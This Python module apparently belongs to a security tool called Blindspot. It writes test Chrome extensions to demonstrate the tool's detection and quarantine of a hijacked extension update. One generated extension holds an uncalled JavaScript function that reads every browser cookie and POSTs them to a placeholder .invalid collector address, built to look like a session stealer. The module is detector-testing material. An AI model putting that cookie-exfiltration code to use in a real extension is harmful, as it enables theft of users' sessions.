"""
A harmless test extension for proving Guard on your own computer.

Owner: A + B

    python -m blindspot test-extension create    # writes version 1.0.0 (storage only)
    python -m blindspot test-extension hijack    # same folder, version 1.1.x asks for much more
    python -m blindspot test-extension restore   # back to 1.0.0
    python -m blindspot test-extension critical  # a second extension that is rated Critical

Load the folder once in chrome://extensions (Developer mode -> Load unpacked).
Chrome keeps the same extension ID for the same folder, exactly like a store
update keeps the ID. After `hijack`, press the reload arrow on the extension card
and run the agent: Guard quarantines 1.1.0.

Nothing here does anything. The 1.1.0 "server" address is a constant that is never
used, on the reserved .invalid domain, so it cannot resolve.
"""
from __future__ import annotations

import json
import time
from pathlib import Path

DEFAULT_DIR = Path.home() / "blindspot-test-extension"

CLEAN = {
    "manifest": {
        "manifest_version": 3,
        "name": "Blindspot Test Extension",
        "version": "1.0.0",
        "description": "Harmless test extension for Blindspot Guard. Does nothing.",
        "permissions": ["storage"],
        "background": {"service_worker": "background.js"},
    },
    "code": "// Blindspot test extension 1.0.0: does nothing.\nchrome.runtime.onInstalled.addListener(() => {});\n",
}

HIJACKED = {
    "manifest": {
        "manifest_version": 3,
        "name": "Blindspot Test Extension",
        "version": "1.1.0",
        "description": "Harmless test extension for Blindspot Guard. Does nothing.",
        "permissions": ["storage", "cookies", "scripting", "tabs"],
        "host_permissions": ["<all_urls>"],
        "background": {"service_worker": "background.js"},
    },
    "code": (
        "// Blindspot test extension 1.1.0: simulates a hijacked update for Guard.\n"
        "// It asks for more access and mentions a new server, but never calls anything.\n"
        "const UPLOAD = \"https://collector.blindspot-test.invalid/upload\"; // never used\n"
        "chrome.runtime.onInstalled.addListener(() => {});\n"
    ),
}


CRITICAL_DIR = Path.home() / "blindspot-test-critical"

# A second, separate test extension that Blindspot rates Critical on first sight.
# The risky code sits in a function that nothing ever calls, and the server is on
# the reserved .invalid domain, so it cannot do anything even when loaded.
CRITICAL = {
    "manifest": {
        "manifest_version": 3,
        "name": "Blindspot Critical Test",
        "version": "1.0.0",
        "description": "Harmless test for Blindspot alerts. Looks dangerous, does nothing.",
        "permissions": ["cookies", "tabs", "scripting", "webRequest", "management", "storage"],
        "host_permissions": ["<all_urls>"],
        "background": {"service_worker": "background.js"},
    },
    "code": (
        "// Blindspot Critical Test: built to LOOK like a session stealer so Blindspot rates it Critical.\n"
        "// neverCalled() is not called anywhere, and the address cannot resolve (.invalid).\n"
        "const COLLECTOR = \"https://collector.blindspot-test.invalid/upload\";\n"
        "async function neverCalled() {\n"
        "  const all = await chrome.cookies.getAll({});\n"
        "  await fetch(COLLECTOR, { method: \"POST\", body: JSON.stringify(all) });\n"
        "}\n"
        "chrome.runtime.onInstalled.addListener(() => {});\n"
    ),
}


def write(build: dict, folder: Path = DEFAULT_DIR) -> Path:
    folder = Path(folder)
    folder.mkdir(parents=True, exist_ok=True)
    (folder / "manifest.json").write_text(json.dumps(build["manifest"], indent=2), encoding="utf-8")
    (folder / "background.js").write_text(build["code"], encoding="utf-8")
    return folder


def run(action: str, folder: Path = DEFAULT_DIR) -> str:
    if action in ("create", "restore"):
        path = write(CLEAN, folder)
        return (f"Version 1.0.0 written to {path}\n"
                "First time: chrome://extensions -> Developer mode -> Load unpacked -> pick that folder.\n"
                "Then run the agent so Guard pins 1.0.0.")
    if action == "hijack":
        # a new version number every time, so the demo (and its alert) can be repeated
        version = f"1.1.{int(time.time()) % 100000}"
        build = {"manifest": dict(HIJACKED["manifest"], version=version), "code": HIJACKED["code"]}
        path = write(build, folder)
        return (f"Version {version} written to {path}\n"
                "Now press the reload arrow on 'Blindspot Test Extension' in chrome://extensions,\n"
                f"then run the agent. Guard should quarantine {version}.")
    if action == "critical":
        path = write(CRITICAL, folder if folder != DEFAULT_DIR else CRITICAL_DIR)
        return (f"'Blindspot Critical Test' written to {path}\n"
                "chrome://extensions -> Load unpacked -> pick that folder, then run the agent.\n"
                "Blindspot rates it Critical and sends a Telegram alert. Remove it from Chrome afterwards.")
    raise ValueError(f"unknown action {action!r}")
